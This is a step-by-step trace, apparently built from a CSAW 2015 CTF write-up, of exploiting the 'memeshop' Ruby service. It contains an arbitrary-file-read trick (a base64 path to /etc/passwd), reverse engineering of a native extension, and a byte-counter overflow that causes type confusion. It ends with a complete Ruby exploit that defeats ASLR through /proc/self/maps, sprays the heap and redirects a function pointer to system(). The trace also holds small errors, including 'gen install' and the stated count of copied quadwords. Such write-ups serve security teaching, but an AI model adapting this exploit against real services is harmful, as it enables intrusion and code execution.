[
    {
        "type": "thought",
        "content": "this is a simple type confusion challenge\nyou have types \"meme\" and \"mrskeletal\"\nthe counter is an int8_t so you can overflow and f it up\nfirst you need ruby\nthen you need colorize"
    },
    {
        "type": "execution",
        "content": "gen install colorize"
    },
    {
        "type": "thought",
        "content": "then you need to build the extension"
    },
    {
        "type": "execution",
        "content": "ruby ./extconf.rb && make"
    },
    {
        "type": "thought",
        "content": "Telnet in, and you're greeted with the following:\n\nhi fellow memers\nwelcome to the meme shop\nu ready 2 buy some dank meme?\n ---------------------------\nI HAVE A DEGREE IN MEMETICS AND BEING USELESS\n ---------------------------\nso... lets see what is on the menu\n[p]rint receipt from confirmation number\n[n]ic cage (RARE MEME)\n[d]erp\nd[o]ge (OLD MEME, ON SALE)\n[f]ry (SHUT UP AND LET ME TAKE YOUR MONEY)\nn[y]an cat\n[l]ike a sir\n[m]r skeletal (doot doot)\n[t]humbs up\nt[r]ollface.jpg\n[c]heck out\n[q]uit\nYou can select the different options and get a meme:\n\n> d\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2584\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2584\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u258c\u2592\u2588\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2584\u2580\u2592\u258c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u258c\u2592\u2592\u2580\u2584\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2584\u2580\u2592\u2592\u2592\u2590\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2590\u2584\u2580\u2592\u2592\u2580\u2580\u2580\u2580\u2584\u2584\u2584\u2580\u2592\u2592\u2592\u2592\u2592\u2590\n\u2500\u2500\u2500\u2500\u2500\u2584\u2584\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2592\u2592\u2584\u2588\u2592\u2590\n\u2500\u2500\u2500\u2584\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2588\u2588\u2580\u2592\u258c\n\u2500\u2500\u2590\u2592\u2592\u2592\u2584\u2584\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2584\u2592\u2592\u258c\n\u2500\u2500\u258c\u2592\u2592\u2590\u2584\u2588\u2580\u2592\u2592\u2592\u2592\u2584\u2580\u2588\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2592\u2590\n\u2500\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u258c\u2588\u2588\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2584\u258c\n\u2500\u258c\u2592\u2580\u2584\u2588\u2588\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2592\u258c\n\u2500\u258c\u2580\u2590\u2584\u2588\u2584\u2588\u258c\u2584\u2592\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2590\n\u2590\u2592\u2580\u2590\u2580\u2590\u2580\u2592\u2592\u2584\u2584\u2592\u2584\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2592\u258c\n\u2590\u2592\u2592\u2592\u2580\u2580\u2584\u2584\u2592\u2592\u2592\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2590\n\u2500\u258c\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2580\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2592\u258c\n\u2500\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2590\n\u2500\u2500\u2580\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2584\u2592\u2592\u2592\u2592\u258c\n\u2500\u2500\u2500\u2500\u2580\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2584\u2584\u2584\u2580\u2592\u2592\u2592\u2592\u2584\u2580\n\u2500\u2500\u2500\u2590\u2580\u2592\u2580\u2584\u2584\u2584\u2584\u2584\u2584\u2580\u2580\u2580\u2592\u2592\u2592\u2592\u2592\u2584\u2584\u2580\n\u2500\u2500\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2580\nAdditionally, you can select mr skeletal, and it asks you to enter something:\n\n> m\n\n\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2584\u2590\n\u2591\u2591\u2591\u2591\u2591\u2591\u2584\u2584\u2584\u2591\u2591\u2584\u2588\u2588\u2584\n\u2591\u2591\u2591\u2591\u2591\u2590\u2580\u2588\u2580\u258c\u2591\u2591\u2591\u2591\u2580\u2588\u2584\n\u2591\u2591\u2591\u2591\u2591\u2590\u2588\u2584\u2588\u258c\u2591\u2591\u2591\u2591\u2591\u2591\u2580\u2588\u2584\n\u2591\u2591\u2591\u2591\u2591\u2591\u2580\u2584\u2580\u2591\u2591\u2591\u2584\u2584\u2584\u2584\u2584\u2580\u2580\n\u2591\u2591\u2591\u2591\u2584\u2584\u2584\u2588\u2588\u2580\u2580\u2580\u2580\n\u2591\u2591\u2591\u2588\u2580\u2584\u2584\u2584\u2588\u2591\u2580\u2580\n\u2591\u2591\u2591\u258c\u2591\u2584\u2584\u2584\u2590\u258c\u2580\u2580\u2580\n\u2584\u2591\u2590\u2591\u2591\u2591\u2584\u2584\u2591\u2588\u2591\u2580\u2580 U HAVE BEEN SPOOKED BY THE\n\u2580\u2588\u258c\u2591\u2591\u2591\u2584\u2591\u2580\u2588\u2580\u2591\u2580\n\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2584\u2584\u2590\u258c\u2584\u2584\n\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2580\u2588\u2588\u2588\u2580\u2588\u2591\u2584\n\u2591\u2591\u2591\u2591\u2591\u2591\u2590\u258c\u2580\u2584\u2580\u2584\u2580\u2590\u2584SPOOKY SKILENTON\n\u2591\u2591\u2591\u2591\u2591\u2591\u2590\u2580\u2591\u2591\u2591\u2591\u2591\u2591\u2590\u258c\n\u2591\u2591\u2591\u2591\u2591\u2591\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2588\n\u2591\u2591\u2591\u2591\u2591\u2590\u258c\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2588\n\u2591\u2591\u2591\u2591\u2591\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2590\u258cSEND THIS TO 7 PPL OR SKELINTONS WILL EAT YOU\nso... what do you say to mr skeletal?\nWhen you're done, you can check out:\n\n> c\n\nur receipt is at L3RtcC9tZW1lMjAxNTA5MjEtMTIxMC1kb2RyY3c=\nyou are going to get memed on so hard with no calcium\nbye\nInteresting! So, when we check out, our receipt is a base64 encoded filename. Base64 decoding it gives /tmp/meme20150921-1210-dodrcw. Let's try the \"print receipt from confirmation number\" options."
    },
    {
        "type": "execution",
        "content": "L2V0Yy9wYXNzd2Q="
    },
    {
        "type": "thought",
        "content": "Why, yes we can! Let's try a wildcard, like /tmp/*.\n\n> p\n\nok, let me know your order number bro: L3RtcC8q\nflag{just kidding, you need a shell}\nThat's not the flag. Let's figure out what's actually going on. The /proc filesystem has interesting tidbits.\nSo, this is a ruby script running from /home/ctf/csaw. We can read both the script and the listed mememachine.so dynamic libraryThe script does some interesting things:\n\n#!/usr/bin/env ruby\nGC.disable\nrequire 'tempfile'\nrequire 'base64'\nrequire 'colorize'\nrequire_relative './plugin/mememachine.so'\nSo, right off the bat, it disables garbage collection, and requires tempfile, base64, colorize, and mememachine.so.\n\ninclude MemeMachine\n\n$stdout.sync = true\n@meme_count = 0\n\n[snip]\n\nputs \"hi fellow memers\"\nputs \"welcome to the meme shop\"\nputs \"u ready 2 buy some dank meme?\"\nputs \" --------------------------- \"\nputs IO.read Dir.glob(\"fortunes/*\").sample\nputs \" --------------------------- \"\n\nputs \"so... lets see what is on the menu\"\n\nquit = false\nwhile not quit\n\tprint_menu\n\tval = gets.chomp\n\tcase val[0]\n\twhen 'q'\n\t\tquit = true\n\t\tnext\n\twhen 'p'\n\t\tprint_receipt\n\t\tnext\n\twhen 'o'\n\t\tdomeme \"./memes/doge.meme\"\n\t\tnext\n\twhen 'n'\n\t\tdomeme \"./memes/cage.meme\"\n\t\tnext\n\twhen 'd'\n\t\tdomeme \"./memes/derp.meme\"\n\t\tnext\n\twhen 'f'\n\t\tdomeme \"./memes/fry.meme\"\n\t\tnext\n\twhen 'y'\n\t\tdomeme \"./memes/nyan.meme\"\n\t\tnext\n\twhen 'l'\n\t\tdomeme \"./memes/sir.meme\"\n\t\tnext\n\twhen 'm'\n\t\tskeletal\n\t\tnext\n\twhen 't'\n\t\tdomeme \"./memes/thumbup.meme\"\n\t\tnext\n\twhen 'r'\n\t\tdomeme \"./memes/troll.meme\"\n\t\tnext\n\twhen 'c'\n\t\tcheckouter\n\t\tquit = true\n\t\tnext\n\tend\nend\nIt then includes the MemeMachine module, and gets going. Notably, methods being called are domeme, skeletal, print_receipt, and checkouter.\n\ndef domeme name\n\t@meme_count = @meme_count + 1\n\tmeme = IO.read name\n\tputs meme\n\taddmeme\nend\nThis method runs an IO.read on the meme filename, and runs the native method addmeme.\n\ndef skeletal\n\t@meme_count = @meme_count + 1\n\tputs IO.read \"./memes/skeleton.meme\"\n\tputs \"so... what do you say to mr skeletal?\"\n\tstr = gets\n\tputs addskeletal Base64.decode64 str\nend\nThis method behaves similarly, but with a hardcoded meme path. Additionally, it reads a line from stdin, base64 decodes it, and runs addskeletal using the decoded string. This method is also native.\n\ndef print_receipt\n\tprint \"ok, let me know your order number bro: \"\n\tstr = gets.chomp\n\tf = Base64.decode64 str\n\tif f.include? \"flag\" or f.include? \"*\"\n\t\tputs \"flag{just kidding, you need a shell}\"\n\telsif File.exist? f\n\t\tputs \"ok heres ur receipt or w/e\"\n\t\tputs IO.read(f)\n\telse\n\t\tputs \"sry br0, i have no records of that\"\n\tend\n\tputs \"\"\nend\nThis method prints the receipt. Of note, we can read any file on the disk, except for files containing flag and *. Since the filesystem is case-sensitive (OS X, anyone?), we need a shell.\n\ndef checkouter\n\tstr = \"u got memed on #{@meme_count} times, memerino\"\n\tfile = Tempfile.new \"meme\"\n\tfile.write str\n\tObjectSpace.undefine_finalizer file\n\tputs \"ur receipt is at #{Base64.encode64 file.path}\"\n\tputs checkout @meme_count\nend\nFinally, this method writes the meme count out to a tempfile. Interestingly, it also undefines the finalizer for that tempfile. Looking at the tempfile docs:\n\nIf you don\u2019t explicitly unlink the temporary file, the removal will be delayed until the object is finalized.\n\nSo, looks like this is to prevent the file from being deleted when the ruby process exits.\nLet's check out the native library in radare2"
    },
    {
        "type": "execution",
        "content": "r2 -A mememachine.so"
    },
    {
        "type": "thought",
        "content": "We've got a few interesting functions. Init_mememachine, called by ruby when the library loads, defines the MemeMachine module and the three methods on that module seen above. So, let's check out each of those functions, starting with method_addmeme.This function calls malloc, and sets up the second quadword of the malloced block to have a function pointer to gooder. It uses the first entry in a global counter array to index into a global memerz array, and uses the global types_tracker to index into a global types array.\n\nEssentially, we can boil this down to the following logic:\n\nint32_t types_tracker = 0;\nuint8_t counter[56] = {0}; // padding\nvoid *memerz[256];\nuint64_t types[256];\n\nVALUE method_addmeme(VALUE self) {\n    void *memer = malloc(0x18);\n    ((uint64_t *)memer)[1] = gooder;\n    ((uint32_t *)memer)[4] = 0;\n    memerz[counter[0]++] = memer;\n    types[types_tracker++] = 0;\n    return rb_str_new_static(\"meme successfully added\", 23);\n}\nThe layout of the malloc'ed block now looks like the following, with the corresponding types entry set to 0:\n\n[64 bits] [64 bits] [32 bits] [32 bits]\nundefined gooder    zero      undefined\nWhat's in gooder?If the function argument is in eax, this function just returns eax != 0, using the setnz instruction.Ok, let's check out method_addskeletal next."
    },
    {
        "type": "execution",
        "content": "s method_addskeletal"
    },
    {
        "type": "thought",
        "content": "The first bit of the method appears to conditionally assign v2 based on a2. We deduced that this was the RSTRING_PTR macro, since RSTRING_NOEMBED works out to 0x2000.\n\nAside: Ruby strings\nVALUE is a 64-bit Ruby reference. Some types (e.g. numbers) have their values embedded directly in the VALUE if they fit, and take up no heap space.\n\nRuby strings (RString instances) are allocated very quickly using an arena where each entry fits a string that is, at most, 24 bytes long. If RSTRING_NOEMBED is set, the 24 bytes contain a heap pointer instead of the string itself, so RSTRING_PTR returns the heap pointer rather than an offset within the RString for strings longer than 24 bytes. See this blog entry for more information.\n\nControl flow\nNext, a block of size 0x118 is allocated, and the first 16 quadwords offset from the string pointer are copied over via an unrolled memcpy. The 34th quadword is assigned to gooder. memcmp, also unrolled here, is called afterwards against the string \"thanks mr skeletal\", but the two branches resulting from the memcmp are essentially the same, except for the \"meme successfully added\" / \"im going to steal all ur calcuims\" string and the assignment of badder instead of gooder (which, incidentally, just returns if its argument is equal to zero).\n\nThe same counter and types_tracker trickery is executed here too, for a control flow that looks like this:\n\nint32_t types_tracker = 0;\nuint8_t counter[56] = {0}; // padding\nvoid *memerz[256];\nuint64_t types[256];\n\nVALUE method_addskeletal(VALUE self, VALUE argument) {\n    const char *str = RSTRING_PTR(argument);\n    void *memer = malloc(0x118);\n    memcpy(memer, str, 15 * sizeof(uint64_t));\n    ((uint64_t *)memer)[33] = gooder;\n    ((uint32_t *)memer)[68] = 0;\n    if (memcmp(memer, \"thanks mr skeletal\", 19) == 0) {\n        memerz[counter[0]++] = memer;\n        types[types_tracker++] = 1;\n        return rb_str_new_static(\"meme successfully added\");\n    } else {\n        ((uint64_t *)memer)[33] = badder;\n        memerz[counter[0]++] = memer;\n        types[types_tracker++] = 1;\n        return rb_str_new_static(\"im going to steal all ur calcuims\");\n    }\n}\nThe layout of this malloc'ed block looks like the following, with the corresponding types entry set to 1:\n\n[64 bits * 15] [64 bits * 18] [64 bits] [32 bits] [32 bits]\ncopied string  undefined      gooder    zero      undefined\nNote: Ruby strings that are less than or equal to 24 bytes in length will result in bits of RString instances from the RString arena being copied to the malloced block, since we are essentially running an out-of-bounds memcpy. We can actually pick which region of the heap we use, and our team ended up using the larger strings because heap spray worked better.\nFinally, what does checkout do?"
    },
    {
        "type": "execution",
        "content": "s method_check"
    },
    {
        "type": "thought",
        "content": "There's a call to rb_fix2int on the second argument (meme_count). If meme_count is <= 0, it jumps to the \"successfully checked out\" branch. Otherwise, it enters a loop from 0 to meme_count - 1, iterating over memerz and types in parallel.\n\nIf type is 0, it reads a function pointer at rax + 0x08 using rax + 0x10 as a 32-bit argument. Otherwise, it reads a function pointer at rax + 0x108 using rax + 0x110 as a 32-bit argument. The rest is fairly irrelevant, because this is the core of the vulnerability in memeshop.\n\nint32_t types_tracker = 0;\nuint8_t counter[56] = {0}; // padding\nvoid *memerz[256];\nuint64_t types[256];\n\ntypedef bool (*meme_validate_t)(int);\n\ntypedef struct meme {\n    uint64_t pad0[1];\n    meme_validate_t function;\n    int arg, pad;\n} meme_t;\n\ntypedef struct skeletal {\n    uint64_t pad0[15];\n    uint64_t pad1[18];\n    meme_validate_t function;\n    int arg, pad;\n} skeletal_t;\n\nVALUE method_checkout(VALUE self, VALUE meme_count) {\n    int count = rb_fix2int(meme_count);\n\n    for (int i = 0; i < count; i++) {\n        void *memer = memerz[i];\n        uint64_t type = types[i];\n        if (type == 0) {\n            // This is a normal meme\n            if (!((meme_t *)memer)->function(((meme_t *)memer)->arg)) {\n                goto invalid;\n            }\n        } else {\n            // This is a skeletal\n            if (!((skeletal_t *)memer)->function(((skeletal_t *)memer)->arg)) {\n                goto invalid;\n            }\n        }\n    }\nvalid:\n    return rb_str_new_static(\"successfully checked out\");\ninvalid:\n    return rb_str_new_static(\"you are going to get memed on so hard with no calcium\");\n}\nNotice that memer is conditionally casted based on the value in types. If we can overwrite the type of this meme with 0 (signaling a normal meme) but really insert a skeletal (which is a bigger malloc'ed block), we can control the function pointer and its argument. So, how do we insert a skeleton with type 0?\nNotice that counter is being stored as a byte, not an int. We can overflow this byte, and make the pointer into memerz wrap around. Meanwhile, types_tracker is being stored as an int, and will happily point beyond the types array. How are they laid out in memory?\nGood. types is at the end of bss, so we won't overwrite anything important if it goes outside the array. We can fill the types array up with zeroes by adding 256 memes, after which skeletals will overwrite pointers to memes and not their types.\nLet's fill the function pointer with a pointer to system(). Since we can download any file, we can grab their version of libc and figure out with objdump that system() lives at address 0x00046640. Since we can read /proc/self/maps, we can also figure out where libc is mapped, defeating ASLR. Since we only have 32 bits for the function argument, we can put it into the heap, which has addresses that fit in 32 bits. By reading .bash_history for the CTF user, we can figure out that the flag is in /home/ctf/flag. We can concoct a decent argument to system by padding cat /home/ctf/flag with spaces, which will ultimately be ignored.\n\nTo fill types with zeroes, we request 256 of any meme (for example, doge). To fill memerz with skeletals, we request 256 more skeletals.\n\nTo figure out where to point into the heap, we can look at the process's maps after spraying doge, estimate how much the heap will expand, and evenly distribute arguments to system over the estimated new part of the heap. Since we're making reasonably large allocations and limiting our search space to the new part of the heap, there is a high chance that one of our system calls will end up in the middle of one of our sleds of spaces either allocated by Ruby or by mememachine.so.\n\nAttacking malloc is interesting, because you essentially have to take a good guess to where your blocks will end up on the heap. If you can control how big your blocks are (or allocate lots of them), your guess will usually end up being right."
    },
    {
        "type": "execution",
        "content": "#!/usr/bin/env ruby\n# Usage: ruby memeheap.rb <host> <port>\n# This script was created for the 2015 CSAW CTF: https://ctf.isis.poly.edu\n\nrequire 'base64'\nrequire 'socket'\n\n# Offset of system() in libc.\nSYSTEM_OFFSET = 0x00046640\n\n# Number of steps we should take to spray the heap.\nSTEPS = 256\n\n# Reads a line.\n# @param socket The socket\n# @param verbose Whether to echo the line\ndef readline socket, verbose=false\n  ret = socket.readline.strip\n  if ret =~ /key{/ or ret =~ /flag{/\n    STDOUT.puts \"\\e[0;31;49m#{ret}\\e[0m\"\n  elsif verbose\n    STDOUT.puts ret\n  end\n\n  ret\nend\n\n# Eats lines until the `quit` phrase signaling that we can enter more text.\n# @param socket The socket\n# @param verbose Whether to echo the lines\ndef eat_until_quit socket, verbose\n  quit = \"\\e[0;31;49m[q]\\e[0muit\"\n  loop do\n    line = readline socket, verbose\n    break if line == quit\n  end\nend\n\n# Returns the heap and libc memory ranges.\n# Useful for calculating addresses.\n# @param socket The socket\n# @return {heap: start..end, libc: start..end}\ndef get_maps socket\n  socket.puts 'p'\n  socket.puts Base64.strict_encode64('/proc/self/maps')\n  heap_range, libc_range = nil, nil\n  loop do\n    line = readline socket\n    case line\n    when %r{\\[heap\\]}\n      heap_range = Range.new *line.split.first.split('-').map {|a| a.to_i(16)}\n    when %r{libc-2\\.19\\.so}\n      libc_range = Range.new *line.split.first.split('-').map {|a| a.to_i(16)} if line =~ %r{r-xp}\n    end\n\n    break if !heap_range.nil? and !libc_range.nil?\n  end\n\n  eat_until_quit socket, false\n\n  {heap: heap_range, libc: libc_range}\nend\n\n# Prints memory maps.\n# @param maps The maps\ndef print_maps maps\n  STDOUT.puts \"Heap size:  #{'%016x' % (maps[:heap].end - maps[:heap].begin)}\"\n  STDOUT.puts \"Heap range: #{'%016x' % maps[:heap].begin} => #{'%016x' % maps[:heap].end}\"\n  STDOUT.puts \"libc range: #{'%016x' % maps[:libc].begin} => #{'%016x' % maps[:libc].end}\"\nend\n\n# Generates a payload.\n# @param idx The index of the payload, in 0 <= idx < tries.\n# @param maps The memory maps\n# @return The payload\ndef generate_payload idx, tries, maps\n  # The command we should get system() to execute.\n  command = 'cat /home/ctf/flag'\n\n  # Rationale for what we're about to do: system() tends to ignore spaces.\n  # Therefore, we should pack lots of spaces in there to use it as a sled\n  # to our command.\n  sled = ''\n\n  # Fill the meme with spaces, and a null-terminated command\n  sled << (' ' * (12 * 8 - command.length) + command) << \"\\x00\"\n\n  # Fill the space after what's copied into this meme with more spaces\n  sled << (' ' * (rand((1 << 15)..(1 << 17)) - command.length) + command) << \"\\x00\"\n\n  # Evenly distribute this payload over the map range\n  length = maps[:heap].end - maps[:heap].begin\n  ptr = maps[:heap].begin + (length * (idx.to_f / tries.to_f)).floor\n\n  # Calculate the system offset\n  system = maps[:libc].begin + SYSTEM_OFFSET\n  payload = [0, system, ptr, 0].pack('Q<Q<L<L<') + sled\n  Base64.strict_encode64(payload).freeze\nend\n\n# Sprays 256 doge onto a socket.\n# @param socket The socket\ndef spray_doge socket\n  STEPS.times do |i|\n    socket.puts 'o'\n    eat_until_quit socket, false\n    STDOUT.puts if i % 32 == 0 and i > 0\n    STDOUT.print '.'\n    STDOUT.flush\n  end\n  STDOUT.puts\nend\n\n# Sprays 256 skeletals onto a socket.\n# @param socket The socket\ndef spray_skeletals maps, socket\n  STEPS.times do |i|\n    payload = generate_payload i, STEPS, maps\n    socket.puts 'm'\n    socket.puts payload\n    eat_until_quit socket, false\n    STDOUT.puts if i % 32 == 0 and i > 0\n    STDOUT.print '.'\n    STDOUT.flush\n  end\n  STDOUT.puts\nend\n\n# Checks out, triggering the vulnerability.\n# @param socket The socket\ndef checkout! socket\n  socket.puts 'c'\n  sleep 1\n  eat_until_quit socket, true\nend\n\n# Create a socket.\nsocket = TCPSocket.new ARGV[0], Integer(ARGV[1])\n\n# Get initial maps\ninitial_maps = get_maps socket\nSTDOUT.puts \">>> Initial maps\"\nprint_maps initial_maps\n\n# Spray doge\nSTDOUT.puts \"*** Spraying doge\"\nspray_doge socket\n\n# Get new maps\ndoge_maps = get_maps socket\nSTDOUT.puts \">>> Doge maps\"\nprint_maps doge_maps\n\n# Figure out where we should scan for skeletals\nexpansion_ratio = 1.5\nestimated_new_size = ((doge_maps[:heap].end - doge_maps[:heap].begin) * expansion_ratio).floor\nestimated_end_offset = doge_maps[:heap].begin + estimated_new_size\nskel_maps = {heap: (doge_maps[:heap].end)..estimated_end_offset, libc: doge_maps[:libc]}\n\nSTDOUT.puts \">>> Scan maps\"\nSTDOUT.puts \"Expansion ratio (estimated): #{'%.4f' % expansion_ratio}\"\nprint_maps skel_maps\n\n# Spray skeletals\nSTDOUT.puts \"*** Spraying skeletals\"\nspray_skeletals skel_maps, socket\n\n# Get final maps\nfinal_maps = get_maps socket\nSTDOUT.puts \">>> Final maps\"\nprint_maps final_maps\n\nbegin\n  # Check out, activating the exploit\n  STDOUT.puts \"*** Checking out\"\n  checkout! socket\nrescue IOError, EOFError => e\n  puts \"EOF\"\nend"
    }
]